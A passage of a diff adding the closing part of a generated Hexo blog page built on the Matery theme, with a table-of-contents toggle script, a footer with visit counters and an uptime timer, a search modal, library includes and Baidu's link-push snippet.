+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">uaa</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">42.4k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "1";
+                    var startDate = "1";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
